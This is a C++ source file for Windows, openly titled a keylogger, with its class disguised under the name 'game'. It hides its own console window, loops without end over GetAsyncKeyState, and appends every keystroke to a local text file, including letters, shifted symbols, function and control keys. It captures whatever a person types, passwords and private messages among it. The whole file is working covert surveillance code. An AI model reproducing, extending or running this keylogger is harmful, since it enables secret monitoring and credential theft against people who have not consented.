#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

class game
	{private:
		char key;
	public:
		void log();
		void display();
		void hide();
	};
game ob;
int main()
	{
	ob.hide();
	ob.display();
	ob.log();
	return 0;
	}

void game::hide()
{	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
}

void game::display()
{
cout<<"\t\tKeylogger"<<endl;
cout<<"\t\t---------";
cout<<endl<<endl;
cout<<"Steps to access the keystrokes."<<endl<<endl;
cout<<"1.Keep the Terminal Open."<<endl;
cout<<"2.Browse the web, or enter the keystrokes."<<endl;
cout<<"3.Open Record.txt to view the keystrokes entered."<<endl;
cout<<endl;
}

void game::log()
{
	while(1)
		{for(ob.key=8;ob.key<=222;ob.key++)
			{
				if(GetAsyncKeyState(ob.key) == -32767)
				{
					ofstream write("Record.text",ios::app);
					/*--------------------LOWER CASE--------------------------------*/
					if(GetAsyncKeyState(0xBA))
						{write<<"<: ;> ";
						 break;
						}
					if(GetAsyncKeyState(0xBF))
						{write<<" <? /> ";
					 	break;
						}
					if(GetAsyncKeyState(0xBB))
						{write<<" <+ => ";
						 break;
						}
					if(GetAsyncKeyState(0xDE))
						{write<<" <' doubleapostrophe> ";
						 break;
						}
					if(GetAsyncKeyState(0xDD))
						{write<<" <} ]> ";
						 break;
						}
					if(GetAsyncKeyState(0xDB))
						{write<<" <{ [> ";
						 break;
						}
					if(GetAsyncKeyState(0xDC))
						{write<<" <\ | > ";
						 break;
						}	
					if( (ob.key>64)&&(ob.key<91) && !(GetAsyncKeyState(0x10)) ) //Shift key is not pressed
						{
						if(GetAsyncKeyState(0xBE))
                    	{write<<".";
                    
						}
					
					 	ob.key+=32; //converting to lower case
					 	write<<ob.key;
					 	write.close();
					 	break;
						}
					/*---------------------UPPER CASE--------------------------------*/
					else if((ob.key>64) && (ob.key<91))
						{
						if(GetAsyncKeyState(0xBE))
                    	{write<<".";
						}
						write<<ob.key;
					 	write.close();
					 	break;

						}
					/*-----------------For Comma ---------------------*/
                    else if(GetAsyncKeyState(0xBC))
                    {write<<",";
                    	 break;
					}
					/*--------------FOR VOLUME-----------------------*/
					else if(GetAsyncKeyState(0xAD))
						{write<<"<VOLUME MUTE>";
						 break;
						}
					else if(GetAsyncKeyState(0xAE))
						{write<<"<VOLUME DOWN>";
						 break;
						}
					else if(GetAsyncKeyState(0xAF))
						{write<<"<VOLUME UP>";
						 break;
						}
					
					/*------------------For FullStop.-----------------*/
                    else if(GetAsyncKeyState(0xBE))
                    {write<<".";
                     break;
					}
					else if(GetAsyncKeyState(0xBA))
					{write<<"<: ;>";
					}
					
					else
						{
					 	switch(ob.key)
							{					
							/*------------NUMBERS AND SYMBOLS----------------*/
							case 49:
								{if((GetAsyncKeyState(0x10))) //shift is enabled
									write<<"!";
							 	else
							 		write<<"1";
								break;
								}
							case VK_OEM_1:
								{write<<"<: ;>";
								 break;
								}
							case VK_OEM_PERIOD:
								{
								write<<".";
								break;
								}
							case 50:
								{if((GetAsyncKeyState(0x10)))
									write<<"@";
							 	else
							 		write<<"2";
								break;
								}
							case 51:
								{if((GetAsyncKeyState(0x10)))
							 		write<<"#";
							 	else
							 		write<<"3";
							 	break;
								}
							case 52:
						 		{
								if((GetAsyncKeyState(0x10)))
						 			write<<"$";
						 		else
						 			write<<"4";
						 		break;
								}
							case 53:
								{if((GetAsyncKeyState(0x10)))
									write<<"%";
								else
									write<<"5";
								break;
								}
							case 54:
								{if((GetAsyncKeyState(0x10)))
									write<<"^";
								else
									write<<"6";
								break;
								}
							case 55:
								{if((GetAsyncKeyState(0x10)))
									write<<"&";
								else
									write<<"7";
								break;
								}
							case 56:
								{if((GetAsyncKeyState(0x10)))
									write<<"*";
								else
									write<<"8";
								break;
								}
							case 57:
								{if((GetAsyncKeyState(0x10)))
									write<<"(";
							 	else
							 		write<<"9";
								break;
								}
							/*-----------------------------------------------*/
							
							case 59:
								{if((GetAsyncKeyState(0x10)))
								 	write<<":";
								 else
								 	write<<";";
								break;
								}
							/*case 44:
								{if((GetAsyncKeyState(0x10)))
									write<<"<";
								 else
								 	write<<",";
								break;
								}
							*/
							case 45:                //_-
								{if((GetAsyncKeyState(0x10)))
									write<<"_";
								 else
								 	write<<"-";
								break;
								}
							case 61:				//=+
								{if((GetAsyncKeyState(0x10)))
									write<<"+";
								else
									write<<"=";
								break;
								}
							case 48:
								{if((GetAsyncKeyState(0x10)))
									write<<")";
							 	else
							 		write<<"0";
							 	break;
								}
							/*case 46:
								{write<<'.';
								 break;
								}
							*/
							
							/*---------------ARROW KEYS------------------------*/
							case VK_UP:
								{write<<"<UP>";
								 break;
								}
							case VK_RIGHT:
								{write<<"<RIGHT>";
								 break;
								}
							case VK_DOWN:
								{write<<"<DOWN>";
								 break;
								}
							case VK_LEFT:
								{write<<"<LEFT>";
								 break;
								}
							case VK_END:
								{write<<"<END>";
								 break;
								}
							case VK_HOME:
								{write<<"<HOME>";
								 break;
								}
							/*-------------------------------------------------------------*/
							
							
							/*------------------NUMPAD OPERATIONS (/ * - +)-----------------*/
							
							case VK_MULTIPLY: //NUMPAD *
								{write<<"<NUMPAD *>";
								 break;
								}
							case VK_ADD:
								{write<<"<NUMPAD +>";
								 break;
								}
							case VK_DIVIDE:
								{write<<"<NUMPAD />";
								 break;
								}
							case VK_SUBTRACT:
								{write<<"<NUM->";
								 break;
								}
							/*--------------------------------------------------*/
							
							/*------------------NUMPAD NUMBERS-----------------*/
							case VK_NUMPAD0:
								{write<<"<NUMPAD0>";
								 break;
								}
							case VK_NUMPAD1:
								{write<<"<NUMPAD1>";
								 break;
								}
							case VK_NUMPAD2:
								{write<<"<NUMPAD2>";
								 break;
								}
							case VK_NUMPAD3:
								{write<<"<NUMPAD3>";
								 break;
								}
							case VK_NUMPAD4:
								{write<<"<NUMPAD4>";
								 break;
								}
							case VK_NUMPAD5:
								{write<<"<NUMPAD5>";
								 break;
								}
							case VK_NUMPAD6:
								{write<<"<NUMPAD6>";
								 break;
								}
							case VK_NUMPAD7:
								{write<<"<NUMPAD7>";
								 break;
								}
							case VK_NUMPAD8:
								{write<<"<NUMPAD8>";
								 break;
								}
							case VK_NUMPAD9:
								{write<<"<NUMPAD9>";
								 break;
								}
							/*------------------------------------------*/
							/*-------------OTHER FUNCTIONS--------------*/
							case VK_PAUSE:
								{write<<"<PAUSE>";
								 break;
								}
							case VK_SLEEP:
								{write<<"<SLEEP>";
								 break;
								}
							/*-----------FUNCTION KEYS------------------*/
							case VK_F1:
								{write<<"<F1>";
								 break;
								}
							case VK_F2:
								{write<<"<F2>";
								 break;
								}
							case VK_F3:
								{write<<"<F3>";
								 break;
								}
							case VK_F4:
								{write<<"<F4>";
								 break;
								}
							case VK_F5:
								{write<<"<F5>";
								 break;
								}
							case VK_F6:
								{write<<"<F6>";
								 break;
								}
							case VK_F7:
								{write<<"<F7>";
								 break;
								}
							case VK_F8:
								{write<<"<F8>";
								 break;
								}
							case VK_F9:
								{write<<"<F9>";
								 break;
								}
							case VK_F10:
								{write<<"<F10>";
								 break;
								}
							case VK_F11:
								{write<<"<F11>";
								 break;
								}
							case VK_F12:
								{write<<"<F12>";
								 break;
								}
							/*--------------------------------------------------*/
							
							/*------------CONTROL, ALT, WINDOWS, etc.-----------*/
							case VK_CONTROL:
								{write<<"<CONTROL>";
								 break;
								}
							case VK_MENU:
								{write<<"<ALT>";
								 break;
								}
							case VK_LMENU:
								{write<<"<LEFT ALT>";
								 break;
								}
							case VK_LCONTROL:
								{write<<"<LEFT CTRL>";
								 break;
								}
							case VK_LWIN:
								{write<<"<LEFT WIN>";
								 break;
								}
							case VK_NUMLOCK:
								{write<<"<NUM LOCK>";
								 break;
								}
							case VK_RMENU:
								{write<<"<RIGHT ALT>";
								 break;
								}
							case VK_RCONTROL:
								{write<<"<RIGHT CONTROL>";
								 break;
								}
												
							case VK_SHIFT:
								{write<<"<SHIFT>";
								 break;
								}
							case VK_VOLUME_DOWN:
								{write<<"<VOLUME DOWN>";
								 break;
								}

							/*case VK_SPACE:
								{write<<"<SPACE>";
								 break;
								}
							*/
							case VK_CAPITAL:
								{write<<"<CAPSLOCK>";
								 break;
								}
							case VK_TAB:
								{write <<"<TAB>";
								 break;
								}
							case VK_BACK:
								{
								write <<"<Backspace>";
								break;
								}
							case VK_ESCAPE:
								{
								write << "<ESC>";
								break;
								}
							case 127:
								{
								write <<"<DEL>";
								break;
								}
							/*--------------------SPACE-----------------*/
							case 32:
								{
								write <<" ";
								break;
								}
							/*------------------ENTER-------------------*/
							case 13:
								{
								write <<"<Enter>\n";
								break;
								}
							/*----------------------------------------------*/
							}
						}
					write.close();

					}
				}

		}
	}

